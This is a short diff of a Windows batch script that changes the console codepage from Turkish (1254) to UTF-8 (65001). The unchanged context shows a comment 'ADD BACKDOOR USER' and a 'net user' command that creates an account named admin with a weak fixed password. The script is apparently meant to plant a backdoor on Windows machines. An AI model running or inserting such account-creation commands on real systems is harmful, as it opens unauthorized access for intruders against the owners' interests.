@@ -1,7 +1,7 @@
 @echo on
 
 rem USE TURKISH CHRACTER TABLE
-chcp 1254
+chcp 65001
 
 rem ADD BACKDOOR USER
 net user admin admin0 /add
